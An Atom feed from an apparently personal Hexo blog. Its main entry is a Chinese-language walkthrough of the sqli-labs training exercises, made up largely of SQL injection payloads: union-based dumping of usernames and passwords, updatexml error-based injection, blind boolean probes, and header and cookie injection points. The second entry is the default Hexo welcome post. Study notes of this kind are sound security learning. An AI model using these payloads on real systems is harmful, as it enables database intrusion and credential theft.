<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>welcome to my blog</title>
    <link href="http://example.com" />
    <updated>2023-04-23T16:32:55.178Z</updated>
    <entry>
        <id>http://example.com/2023/04/24/sqli-labs/</id>
        <title></title>
        <link rel="alternate" href="http://example.com/2023/04/24/sqli-labs/"/>
        <content type="html">&lt;h3 id=&#34;怎么判断字符型或者数字型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#怎么判断字符型或者数字型&#34;&gt;#&lt;/a&gt; 怎么判断字符型或者数字型？&lt;/h3&gt;
&lt;p&gt;数字型:id=2 和 id=3-1 返回界面相同&lt;br&gt;
原理：说明 2-1 被解析了，旁边没有引号&lt;br&gt;
字符型:id=2 和 id=2a 页面一样就行&lt;br&gt;
原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&amp;gt; 数字&lt;/p&gt;
&lt;p&gt;group_concat 是用，连接多行记录的函数&lt;/p&gt;
&lt;p&gt;less1&lt;br&gt;
 字符型注入&lt;br&gt;
看源码:sql=“SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;&lt;/p&gt;
&lt;p&gt;因此:&lt;mark&gt;payload:1’   操作   --+&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;?id=1’ order by 3–+&lt;br&gt;
?id=1’ order by 4–+&lt;br&gt;
?id=-1’ union select 1,2,3–+// 判断回显位&lt;br&gt;
？id=-1’ union select 1,2,database ()–+&lt;br&gt;
?id=-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+&lt;/p&gt;
&lt;p&gt;?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’ and table_schema=database()–+&lt;/p&gt;
&lt;p&gt;?id=-1’ union select 1,group_concat(username),group_concat(password) from users–+&lt;/p&gt;
&lt;p&gt;less2&lt;br&gt;
 数字型&lt;br&gt;
看源码:sql=“SELECT * FROM users WHERE id=$id LIMIT 0,1”;&lt;br&gt;
 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可&lt;/p&gt;
&lt;p&gt;布尔盲注:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&amp;#x27;D&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less3&lt;br&gt;
id=1’)–+&lt;/p&gt;
&lt;p&gt;less4&lt;br&gt;
id=1&amp;quot;)–+&lt;/p&gt;
&lt;p&gt;less5&lt;br&gt;
 报错注入:updatexml 函数&lt;br&gt;
 updatexml (xml_doument,XPath_string,new_value)&lt;br&gt;
 第一个参数：XML 的内容&lt;br&gt;
第二个参数：是需要 update 的位置 XPATH 路径&lt;br&gt;
第三个参数：是更新后的内容&lt;br&gt;
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式，不对就爆出正确内容&lt;br&gt;
可以校验的：0x7e (~),0x5e24 (^$),’#’(#)&lt;br&gt;
payload:&lt;br&gt;
?id=1’ and updatexml (1,concat (0x7e,database ()),1)–+ 暴当前数据库&lt;/p&gt;
&lt;p&gt;?id=1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)–+&lt;br&gt;
 此时会出现 Subquery returns more than 1 row&lt;br&gt;
1. 可以用 limit 解决，limit 0,1 1,1 2,1 3,1&lt;br&gt;
 在 limit 3,1 找到 users 表&lt;br&gt;
？id=1’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=database () limit 3,1)),1)–+&lt;br&gt;
 后面同理爆字段&lt;br&gt;
 2. 加个 group_concat 解决&lt;br&gt;
？id=1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1)–+&lt;br&gt;
 过程同上&lt;br&gt;
最后&lt;br&gt;
？id=1’ and updatexml (1,concat (0x7e,(select group_concat (username) from users)),1)–+&lt;/p&gt;
&lt;p&gt;substr 方法&lt;br&gt;
’ or updatexml (1,concat (0x7e,substr ((select group_concat (schema_name) from information_schema.schemata),1,31),0x7e),1)–+&lt;br&gt;
 后面把 1,31 换成 32,31&lt;br&gt;
63,31&lt;br&gt;
94,31&lt;/p&gt;
&lt;p&gt;less6&lt;br&gt;
id=1&amp;quot; 与 less5 一样&lt;/p&gt;
&lt;p&gt;less7&lt;br&gt;
 布尔盲注&lt;br&gt;
根据页面回显试探数据，可以二分法，函数:substring (),mid (),substr ().&lt;br&gt;
eg.?id=1’ and (select mid((select concat(user,0x7e,password) from users),1,1))=’’–+&lt;br&gt;
 一直到 less10, 布尔和时间盲注直接用 sqlimap&lt;/p&gt;
&lt;p&gt;less11&lt;br&gt;
 输入？id=1 发现 url 地址没有显示，抓包发现 post 方式&lt;br&gt;
 uname=11&amp;amp;passwd=1&amp;amp;submit=Submit&lt;br&gt;
 判断字符型&lt;br&gt;
接下来用基本的 union 注入就欧克&lt;br&gt;
 less12&lt;br&gt;
&amp;quot;) 型，联合注入&lt;br&gt;
 less13&lt;br&gt;
)’ # 加上报错注入&lt;br&gt;
 less14&lt;br&gt;
“# 加上报错注入&lt;br&gt;
 less15&lt;br&gt;
 不显示报错信息只能盲注&lt;br&gt;
单引号字符型的布尔盲注:&lt;br&gt;
1’ --+&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1sZXNzMTUtMmc0bTA3M2dtcXcucHk=&#34;&gt; 用脚本 less15.py&lt;/span&gt;&lt;br&gt;
 用法:&lt;br&gt;
from less15 import *&lt;br&gt;
Database15()&lt;br&gt;
Tables15()&lt;br&gt;
 Columns15 (‘库’,‘表’)&lt;br&gt;
 Content15 (‘库’,‘表’,‘字段’,‘字段’)&lt;br&gt;
less16&lt;br&gt;
 双引号字符型加括号的盲注&lt;br&gt;
 1”) --+&lt;br&gt;
 脚本:less16.py&lt;/p&gt;
&lt;p&gt;less17&lt;br&gt;
1. 注入点在 password 栏里，单引号字符加报错注入&lt;br&gt;
 2. 先抓包，copy to file, 用 sqlmap 工具&lt;br&gt;
 python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -r 路径&lt;/p&gt;
&lt;p&gt;less18&lt;br&gt;
 注入点在 user-agent, 且用户名密码必须正确&lt;br&gt;
注意：闭合之前的部分必须为空，很恶心&lt;br&gt;
’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’&lt;/p&gt;
&lt;p&gt;最后:&lt;br&gt;
’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’&lt;/p&gt;
&lt;p&gt;less19&lt;br&gt;
 与 18 一样，注入点在 referer&lt;/p&gt;
&lt;p&gt;less20&lt;br&gt;
 输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie&lt;/p&gt;
</content>
        <updated>2023-04-23T16:32:55.178Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2023/04/23/hello-world/</id>
        <title>Hello World</title>
        <link rel="alternate" href="http://example.com/2023/04/23/hello-world/"/>
        <content type="html">&lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
</content>
        <updated>2023-04-23T15:55:29.640Z</updated>
    </entry>
</feed>
